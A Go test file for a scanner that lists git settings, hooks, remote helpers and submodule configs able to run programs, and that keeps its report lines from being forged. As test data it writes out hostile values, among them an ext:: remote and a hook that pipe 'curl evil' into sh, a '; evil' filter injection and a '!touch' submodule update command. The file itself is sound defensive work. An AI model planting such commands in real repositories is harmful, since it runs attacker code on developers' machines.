package gitx

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestRunsProgramMore(t *testing.T) {
	cases := []struct {
		key, value string
		want       bool
	}{
		{"remote.origin.uploadpack", "/tmp/up", true},
		{"remote.origin.receivepack", "/tmp/rp", true},
		{"remote.origin.vcs", "evil", true},
		{"submodule.lib.update", "!/tmp/u", true},
		{"submodule.lib.update", "checkout", false},
		{"submodule.lib.update", "rebase", false},
		{"submodule.lib.update", "none", false},
		{"gpg.ssh.defaultkeycommand", "/tmp/k", true},
		{"lfs.extension.x.clean", "/tmp/c", true},
		{"lfs.extension.x.smudge", "/tmp/s", true},
		{"lfs.customtransfer.x.path", "/tmp/agent", true},
		{"protocol.ext.allow", "always", true},
		{"protocol.ext.allow", "user", true},
		{"protocol.ext.allow", "never", false},
		{"protocol.allow", "always", true},
		{"protocol.allow", "user", false},
		{"protocol.file.allow", "always", false},
		{"lfs.url", "https://example.com", false},
	}
	for _, c := range cases {
		if got := runsProgram(c.key, c.value); got != c.want {
			t.Errorf("runsProgram(%q, %q) = %v, want %v", c.key, c.value, got, c.want)
		}
	}
}

func TestStandardLFSFilter(t *testing.T) {
	cases := []struct {
		key, value string
		want       bool
	}{
		{"filter.lfs.clean", "git-lfs clean -- %f", true},
		{"filter.lfs.smudge", "git-lfs smudge -- %f", true},
		{"filter.lfs.process", "git-lfs filter-process", true},
		{"filter.lfs.clean", "git-lfs clean -- %f; evil", false},
		{"filter.lfs.process", "", false},
		{"filter.other.clean", "git-lfs clean -- %f", false},
		{"filter.lfs.required", "true", false},
	}
	for _, c := range cases {
		if got := StandardLFSFilter(c.key, c.value); got != c.want {
			t.Errorf("StandardLFSFilter(%q, %q) = %v, want %v", c.key, c.value, got, c.want)
		}
	}
}

func TestRemoteLocation(t *testing.T) {
	cases := map[string]string{
		"https://example.com/a.git":      "",
		"ssh://git@example.com/a.git":    "",
		"git@github.com:org/repo.git":    "",
		"example.com:org/repo.git":       "",
		"git://example.com/a.git":        "",
		"/srv/git/a.git":                 "local",
		"../other":                       "local",
		"other":                          "local",
		`C:\repos\a.git`:                 "local",
		"C:/repos/a.git":                 "local",
		"file:///srv/git/a.git":          "local",
		"FILE:///srv/git/a.git":          "local",
		"ext::sh -c 'curl evil | sh'":    "helper",
		"myhelper::https://example.com/": "helper",
		"":                               "",
	}
	for u, want := range cases {
		if got := remoteLocation(u); got != want {
			t.Errorf("remoteLocation(%q) = %q, want %q", u, got, want)
		}
	}
}

func TestALocalRemoteIsListedWithTheHooksItWouldRun(t *testing.T) {
	repo := newRepo(t)
	bare := filepath.Join(t.TempDir(), "remote.git")
	gitRun(t, repo, "init", "--bare", "-q", bare)
	gitRun(t, repo, "remote", "add", "origin", filepath.ToSlash(bare))
	writeHook(t, filepath.Join(bare, "hooks"), "pre-receive", "#!/bin/sh\n")

	rep := scan(t, repo)
	if p, ok := find(rep, "setting", "remote.origin.url"); !ok || p.Value != filepath.ToSlash(bare) {
		t.Fatalf("a remote on this machine was not listed: %+v", rep.Items)
	}
	h, ok := find(rep, "hook", "pre-receive")
	if !ok || !strings.HasSuffix(slash(h.Where), "/remote.git/hooks") {
		t.Fatalf("the remote's own hook was not listed: %+v", rep.Items)
	}
	writeHook(t, filepath.Join(bare, "hooks"), "pre-receive", "#!/bin/sh\ncurl evil | sh\n")
	h2, _ := find(scan(t, repo), "hook", "pre-receive")
	if h.ID() == h2.ID() {
		t.Error("editing the remote's hook did not change it")
	}
}

func TestNetworkRemotesAreNotListedButHelpersAre(t *testing.T) {
	repo := newRepo(t)
	gitRun(t, repo, "remote", "add", "web", "https://example.com/a.git")
	gitRun(t, repo, "remote", "add", "ssh", "git@example.com:a/b.git")
	if rep := scan(t, repo); len(rep.Items) != 0 {
		t.Fatalf("ordinary remotes were listed: %+v", rep.Items)
	}
	gitRun(t, repo, "remote", "add", "x", "ext::sh -c true")
	p, ok := find(scan(t, repo), "setting", "remote.x.url")
	if !ok || p.Value != "ext::sh -c true" {
		t.Errorf("an ext:: remote was not listed: %+v", p)
	}
}

func TestARewriteToALocalPathOrHelperIsListed(t *testing.T) {
	repo := newRepo(t)
	gitRun(t, repo, "config", "url.https://example.com/.insteadOf", "gh:")
	if rep := scan(t, repo); len(rep.Items) != 0 {
		t.Fatalf("a rewrite to a web address was listed: %+v", rep.Items)
	}
	local := t.TempDir()
	gitRun(t, repo, "config", "url."+filepath.ToSlash(local)+".pushInsteadOf", "gh:")
	gitRun(t, repo, "config", "url.ext::sh -c true.insteadOf", "evil:")
	rep := scan(t, repo)
	n := 0
	for _, p := range rep.Items {
		if strings.HasPrefix(p.Name, "url.") {
			n++
		}
	}
	if n != 2 {
		t.Errorf("found %d rewrites to a local path or helper, want 2: %+v", n, rep.Items)
	}
}

func TestAHookIsFoundByTheNameTheFileSystemMatches(t *testing.T) {
	repo := newRepo(t)
	hooks := filepath.Join(repo, ".git", "hooks")
	p := writeHook(t, hooks, "Pre-Commit", "#!/bin/sh\n")
	if _, err := os.Stat(filepath.Join(hooks, "pre-commit")); err != nil {
		t.Skip("this file system tells Pre-Commit and pre-commit apart, so git does too")
	}
	_ = p
	if _, ok := find(scan(t, repo), "hook", "pre-commit"); !ok {
		t.Error("a hook spelled Pre-Commit, which git runs here, was not found")
	}
}

func TestAHookThatCannotBeReadIsStillReported(t *testing.T) {
	if runtime.GOOS == "windows" || os.Geteuid() == 0 {
		t.Skip("needs permissions that bind this user")
	}
	// Executable but not readable: git runs it, and it cannot be hashed.
	repo := newRepo(t)
	hooks := filepath.Join(repo, ".git", "hooks")
	p := writeHook(t, hooks, "pre-commit", "#!/bin/sh\n")
	if err := os.Chmod(p, 0o111); err != nil {
		t.Fatal(err)
	}
	h, ok := find(scan(t, repo), "hook", "pre-commit")
	if !ok || !strings.HasPrefix(h.Sum, "unreadable") {
		t.Errorf("an unreadable hook = %+v ok=%v, want it listed", h, ok)
	}

	// A directory that can be searched and not listed still runs its hooks.
	if err := os.Chmod(p, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(hooks, 0o311); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chmod(hooks, 0o755) })
	if _, ok := find(scan(t, repo), "hook", "pre-commit"); !ok {
		t.Error("a hook in a directory that cannot be listed was not found")
	}

	// And a directory that cannot even be searched is an item of its own.
	if err := os.Chmod(hooks, 0o000); err != nil {
		t.Fatal(err)
	}
	rep := scan(t, repo)
	if u, ok := find(rep, "unreadable", ""); !ok || !strings.HasSuffix(slash(u.Where), "/.git/hooks") {
		t.Errorf("an unreadable hooks directory = %+v", rep.Items)
	}
	if v := Judge(rep, nil); !v.Warn {
		t.Error("an unreadable hooks directory was not warned about on first sight")
	}
}

func TestMoreSubmodulesThanAreScannedIsAnItem(t *testing.T) {
	repo := newRepo(t)
	modules := filepath.Join(repo, ".git", "modules")
	for i := 0; i < maxSubmodules+5; i++ {
		d := filepath.Join(modules, fmt.Sprintf("a%03d", i))
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(d, "HEAD"), []byte("ref: refs/heads/main\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	// One past the limit, which holds what a scan would have found.
	late := filepath.Join(modules, "zzz")
	if err := os.MkdirAll(late, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(late, "HEAD"), []byte("ref: refs/heads/main\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(late, "config"), []byte("[core]\n\tsshCommand = ssh -F planted\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	rep := scan(t, repo)
	if _, ok := find(rep, "limit", ""); !ok {
		t.Fatalf("hitting the limit left no trace: %d items", len(rep.Items))
	}
	if v := Judge(rep, nil); !v.Warn {
		t.Error("a scan that stopped at its limit was not warned about")
	}
}

func TestModulesNestedTooDeepAreAnItem(t *testing.T) {
	repo := newRepo(t)
	d := filepath.Join(repo, ".git", "modules")
	for i := 0; i < maxModuleDeep+3; i++ {
		d = filepath.Join(d, "m")
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(d, "HEAD"), []byte("ref: refs/heads/main\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		d = filepath.Join(d, "modules")
	}
	if _, ok := find(scan(t, repo), "limit", ""); !ok {
		t.Error("modules nested past the depth limit left no trace")
	}
}

func TestALineCannotForgeAnItemOrRunOnForever(t *testing.T) {
	p := Program{Kind: "setting", Name: "core.sshcommand", Where: "/r/.git/config",
		Value: "ssh\n- hook pre-commit (in /ok)\r\u202e\x1b[31m" + strings.Repeat("x", 5000)}
	line := p.Line()
	for _, bad := range []string{"\n", "\r", "\u202e", "\x1b"} {
		if strings.Contains(line, bad) {
			t.Errorf("the line holds %q: %q", bad, line)
		}
	}
	if n := len([]rune(line)); n > 400 {
		t.Errorf("the line is %d characters long", n)
	}
	if !strings.HasPrefix(line, "core.sshcommand = ssh- hook") {
		t.Errorf("line = %q", line)
	}

	var items []Program
	for i := 0; i < maxListed+5; i++ {
		items = append(items, Program{Kind: "setting", Name: fmt.Sprintf("core.sshcommand%02d", i), Value: "v", Where: "/r"})
	}
	lines := Verdict{New: items}.Lines()
	if len(lines) != maxListed+1 || lines[maxListed] != "and 5 more" {
		t.Errorf("%d lines, last %q", len(lines), lines[len(lines)-1])
	}
	intro := Verdict{First: true}.Intro("commit")
	if !strings.Contains(intro, "If you did not") {
		t.Errorf("the advice is not in the part that is shown first: %q", intro)
	}
}

func TestAHookTooBigToReadIsIdentifiedBySizeAndTime(t *testing.T) {
	repo := newRepo(t)
	p := writeHook(t, filepath.Join(repo, ".git", "hooks"), "pre-commit", "#!/bin/sh\n")
	if err := os.Truncate(p, maxHashed+1); err != nil {
		t.Skip(err)
	}
	h, ok := find(scan(t, repo), "hook", "pre-commit")
	if !ok || !strings.HasPrefix(h.Sum, "large:") {
		t.Errorf("hook = %+v ok=%v, want it identified by size and time", h, ok)
	}
}

func TestASubmodulesRelativeHooksPathIsFromItsWorkTree(t *testing.T) {
	outer := newRepo(t)
	mod := addSubmodule(t, outer)
	if rep := scan(t, outer); len(rep.Items) != 0 {
		t.Fatalf("a clean submodule runs %+v", rep.Items)
	}
	gitRun(t, mod, "config", "core.hooksPath", ".hk")
	writeHook(t, filepath.Join(mod, ".hk"), "pre-commit", "#!/bin/sh\n")
	h, ok := find(scan(t, outer), "hook", "pre-commit")
	if !ok || !strings.HasSuffix(slash(h.Where), "/mod/.hk") {
		t.Fatalf("hook = %+v ok=%v, want the one in the submodule's work tree", h, ok)
	}
}

func TestASubmoduleConfigEditedAfterAScanIsSeen(t *testing.T) {
	// The configuration of a submodule is remembered between scans by its
	// contents, so a change has to show.
	outer := newRepo(t)
	mod := addSubmodule(t, outer)
	scan(t, outer)
	gitRun(t, mod, "config", "core.sshCommand", "ssh -i one")
	if p, ok := find(scan(t, outer), "setting", "core.sshcommand"); !ok || p.Value != "ssh -i one" {
		t.Fatalf("first edit: %+v", p)
	}
	gitRun(t, mod, "config", "core.sshCommand", "ssh -i two")
	if p, ok := find(scan(t, outer), "setting", "core.sshcommand"); !ok || p.Value != "ssh -i two" {
		t.Errorf("second edit: %+v", p)
	}
	gitRun(t, mod, "config", "--unset", "core.sshCommand")
	if _, ok := find(scan(t, outer), "setting", "core.sshcommand"); ok {
		t.Error("a setting that was removed is still reported")
	}
}

func TestSubmoduleUpdateCommandIsReported(t *testing.T) {
	outer := newRepo(t)
	gitRun(t, outer, "config", "submodule.lib.update", "!touch /tmp/x")
	if _, ok := find(scan(t, outer), "setting", "submodule.lib.update"); !ok {
		t.Error("a submodule update command was not reported")
	}
}

func TestDiffsAreToldNotToRunATextconv(t *testing.T) {
	if !Available() {
		t.Skip("git is not installed")
	}
	found := false
	for _, f := range diffFlags {
		if f == "--no-textconv" {
			found = true
		}
	}
	if !found {
		t.Fatal("the diff flags do not turn textconv off")
	}
	repo := newRepo(t)
	marker := filepath.Join(repo, "textconv-ran.txt")
	script := filepath.Join(t.TempDir(), "conv.sh")
	if err := os.WriteFile(script, []byte("#!/bin/sh\necho ran > \""+filepath.ToSlash(marker)+"\"\ncat \"$1\"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, ".gitattributes"), []byte("*.md diff=evil\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	gitRun(t, repo, "config", "diff.evil.textconv", filepath.ToSlash(script))
	// Without the flag git runs it, or there is nothing to prove.
	plain := exec.Command("git", "diff", "--no-ext-diff")
	plain.Dir = repo
	if err := os.WriteFile(filepath.Join(repo, "README.md"), []byte("changed\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	_, _ = plain.Output()
	if _, err := os.Stat(marker); err != nil {
		t.Skip("this git ran no textconv, so there is nothing to stop")
	}
	os.Remove(marker)
	if _, err := Diff(repo, "README.md"); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Error("the panel's diff ran the repository's textconv program")
	}
}

func TestAHugeModulesFolderIsAnItemNotASilentSkip(t *testing.T) {
	repo := newRepo(t)
	modules := filepath.Join(repo, ".git", "modules")
	for i := 0; i < maxModuleDirs+5; i++ {
		if err := os.MkdirAll(filepath.Join(modules, fmt.Sprintf("d%04d", i)), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if _, ok := find(scan(t, repo), "limit", ""); !ok {
		t.Error("a modules folder with more directories than are visited left no trace")
	}
}

func TestASubmoduleConfigThatCannotBeReadIsAnItem(t *testing.T) {
	repo := newRepo(t)
	d := filepath.Join(repo, ".git", "modules", "x")
	// A folder where the file should be: git cannot read it either, and then
	// gives up on the whole repository, which is no reason to say nothing runs.
	if err := os.MkdirAll(filepath.Join(d, "config"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(d, "HEAD"), []byte("ref: refs/heads/main\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	u, ok := find(scan(t, repo), "unreadable", "")
	if !ok || u.Submodule == "" || !strings.HasSuffix(slash(u.Where), "/x/config") {
		t.Errorf("an unreadable submodule configuration = %+v ok=%v", u, ok)
	}
}
